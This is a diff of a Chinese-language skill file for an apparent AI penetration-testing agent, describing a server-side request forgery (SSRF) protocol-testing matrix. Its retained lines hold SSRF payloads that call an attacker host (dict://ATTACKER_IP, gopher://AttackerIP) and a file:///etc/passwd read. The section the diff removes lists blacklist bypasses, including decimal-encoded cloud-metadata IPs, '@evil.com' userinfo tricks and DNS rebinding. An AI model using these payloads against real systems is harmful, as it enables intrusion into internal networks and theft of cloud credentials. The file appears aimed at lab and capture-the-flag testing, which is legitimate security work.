@@ -1,10 +1,9 @@
 ---
 name: 'ssrf-protocol-matrix'
-description: 'SSRF 协议矩阵 + 黑名单绕过：file/gopher 探测 → 能力分级 L1-L6 → 检查表；含实战绕过（IMDS 十进制 IP 2852039166、?x.yaml 后缀伪造、八进制），Nimbus 等 Hard 靶机亲测有效'
-whenToUse: '发现 URL 抓取/导入/回调等 SSRF 原语后、动手测协议之前必读；内网地址被黑名单拦时直接查绕过节。'
+description: 'SSRF 协议测试矩阵：file/http/netdoc/gopher 逐个试 → 能力分级 L1-L6 → 关键问题检查表（检索词：ssrf protocol matrix）'
 metadata: { domain: web, tier: T1 }
 ---
-
+> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
 
 # SSRF 协议测试矩阵
 
@@ -26,7 +25,7 @@ netdoc:///etc/passwd        # Java netdoc — 同 file://
 dict://ATTACKER_IP:9999/    # Dict 协议
 jar://                      # Java JAR — 可能远程加载类
 ftp://                       # FTP — 可能读取/写入
-```text
+```
 
 ## 2. SSRF 能力分级
 
@@ -39,22 +38,9 @@ ftp://                       # FTP — 可能读取/写入
 | L5 | CRLF 注入 | `http://AttackerIP/%0d%0aInjected:yes` — 注意 Java 会 URL 编码 CRLF |
 | L6 | Gopher | `gopher://AttackerIP/_DATA` 发送原始 TCP |
 
-## 黑名单/白名单绕过（实战）
-
-> Nimbus 实战：字符串黑名单被十进制 IP 2130706433 绕过直达元数据服务；"floci" 子串整 URL 匹配拦截；重定向不被跟随但会被检查
-
-- **十进制 IP**：`2130706433` = 127.0.0.1（`http://2130706433/` 绕过只过滤 `127.0.0.1`/`localhost` 的黑名单，直达元数据服务）；IMDS 用 `2852039166` = 169.254.169.254
-- **后缀检查绕过**：要求 URL 以 `.yaml` 结尾时，用 query 技巧 `?x.yaml` / 路径参数 `/a.yaml?x=` 或 `#.yaml` 伪造后缀（Nimbus 实测：`?x.yaml` 通过）
-- **八进制 / 十六进制 IP**：`0177.0.0.1`（八进制）、`0x7f000001`（十六进制）→ 127.0.0.1
-- **`127.1` 缩写**：IP 简写，`127.1` 解析为 127.0.0.1
-- **URL userinfo `@`**：`http://127.0.0.1@evil.com/` — 解析器取 `@` 后为真实目标，黑名单只匹配 host 前缀则被绕过
-- **DNS rebinding**：域名首次解析为公网 IP（过白名单），后续解析为内网 IP（打内网）
-- **302 重定向链**：外部域名 → 302 → 内网地址；部分实现跟随重定向但不复查黑名单
-- **URL 编码变体**：`%31%32%37.0.0.1`、`127.0.0.1%00`、双重编码、混合大小写十六进制
-
 ## 3. 每个协议的关键问题
 
-```text
+```
 [ ] file:// → 能读哪些文件？（用户的 home？/etc？root-owned？）
 [ ] file:// → 能列目录吗？（末尾 /）
 [ ] http:// → 能出外网吗？（AttackerIP 收到回调？）
@@ -65,11 +51,9 @@ ftp://                       # FTP — 可能读取/写入
 [ ] http:// → 跟随重定向吗？（Java URLConnection 默认跟随）
 [ ] gopher:// → 可用吗？（构造任意 TCP 流的关键）
 [ ] ftp:// → 支持上传吗？（通常不支持 STOR）
-```text
+```
 
 ## 4. DevArea 实测结果
-
-（DevArea/Apache CXF 环境实测）
 
 | 协议 | 结果 | 备注 |
 |------|------|------|
@@ -94,4 +78,4 @@ PROTOCOLS = [
 for url, desc in PROTOCOLS:
     trigger_ssrf(url)
     print(f"{desc}: check listener")
-```text
+```
